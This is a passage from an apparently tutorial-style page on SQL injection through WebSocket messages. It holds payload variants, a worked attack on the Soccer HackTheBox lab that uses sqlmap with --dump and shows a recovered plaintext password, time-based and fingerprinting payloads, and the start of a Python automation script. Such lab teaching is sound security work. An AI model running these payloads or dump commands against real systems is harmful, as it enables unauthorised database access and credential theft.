class=\"s2\"\u003e\u0026#34;1\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;2\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1-- -\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;3\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"message-format-variations\"\u003eMessage Format Variations\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-json\" data-lang=\"json\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Different parameter names\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;user_id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39; OR 1=1-- -\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;session_id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39; OR 1=1-- -\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;query\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39; OR 1=1-- -\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Multiple parameters\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026#34;type\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;user\u0026#39; OR 1=1-- -\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Base64 encoded payloads\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;MSBPUiAxPTEtLSAt\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e  \u003cspan class=\"c1\"\u003e// 1 OR 1=1-- -\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"real-world-example-soccer-htb\"\u003eReal-World Example: Soccer HTB\u003c/h2\u003e\n\u003ch3 id=\"connection-setup\"\u003eConnection Setup\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-javascript\" data-lang=\"javascript\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Target WebSocket from Soccer HTB\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ews\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eWebSocket\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ws://soc-player.soccer.htb:9091\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003ews\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eonopen\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Connected to soccer WebSocket\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003ews\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eonmessage\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Response:\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"testing-process\"\u003eTesting Process\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-javascript\" data-lang=\"javascript\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// 1. Test basic functionality\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"nx\"\u003ews\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eJSON\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estringify\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// 2. Test for SQL injection\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"nx\"\u003ews\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eJSON\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estringify\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39;\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// 3. Boolean-based testing\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"nx\"\u003ews\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eJSON\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estringify\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;92130 or 5=1-- -\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// 4. Confirm vulnerability\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"nx\"\u003ews\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eJSON\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estringify\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1 OR 1=1-- -\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"sqlmap-exploitation\"\u003esqlmap Exploitation\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Soccer HTB WebSocket SQLi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esqlmap -u \u003cspan class=\"s1\"\u003e\u0026#39;ws://soc-player.soccer.htb:9091/\u0026#39;\u003c/span\u003e --data \u003cspan class=\"s1\"\u003e\u0026#39;{\u0026#34;id\u0026#34;:\u0026#34;*\u0026#34;}\u0026#39;\u003c/span\u003e --level \u003cspan class=\"m\"\u003e5\u003c/span\u003e --risk \u003cspan class=\"m\"\u003e3\u003c/span\u003e --batch --threads \u003cspan class=\"m\"\u003e10\u003c/span\u003e -D soccer_db --dump\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Results found:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Database: soccer_db\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Table: accounts\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# [1 entry]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# +------+-------------------+----------------------+----------+\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# | id   | email             | password             | username |\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# +------+-------------------+----------------------+----------+\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# | 1324 | player@player.htb | PlayerOftheMatch2022 | player   |\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# +------+-------------------+----------------------+----------+\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"detection-and-response-analysis\"\u003eDetection and Response Analysis\u003c/h2\u003e\n\u003ch3 id=\"response-analysis\"\u003eResponse Analysis\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Look for different response patterns\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# - Response time differences (time-based)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# - Content length variations (boolean-based)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# - Error messages (error-based)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# - Data extraction (union-based)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Response timing measurement\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003etime\u003c/span\u003e \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;{\u0026#34;id\u0026#34;:\u0026#34;1 AND SLEEP(5)\u0026#34;}\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e wscat -c ws://target:9091\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"database-fingerprinting\"\u003eDatabase Fingerprinting\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-json\" data-lang=\"json\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// MySQL detection\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39; AND @@version LIKE \u0026#39;%mysql%\u0026#39;-- -\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// SQL Server detection  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39; AND @@version LIKE \u0026#39;%Microsoft%\u0026#39;-- -\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// PostgreSQL detection\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39; AND version() LIKE \u0026#39;%PostgreSQL%\u0026#39;-- -\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// SQLite detection\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026#34;id\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1\u0026#39; AND sqlite_version() IS NOT NULL-- -\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003ch2 id=\"automation-scripts\"\u003eAutomation Scripts\u003c/h2\u003e\n\u003ch3 id=\"python-websocket-sqli-script\"\u003ePython WebSocket SQLi Script\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003ewebsocket\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003ejson\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003etime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003etest_websocket_sqli\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003epayloads\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eon_message\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ews\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003emessage\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nb\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"sa\"\u003ef\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Response: \u003c/span\u003e\u003cspan class=\"si\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003emessage\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eon_error\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ews\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nb\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"sa\"\u003ef\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Error: \u003c/span\u003e\u003cspan class=\"si\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003eerror\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eon_close\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ews\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eclose_status_code\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eclose_msg\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nb\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Connection closed\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eon_open\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ews\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nb\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Connected to WebSocket\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan 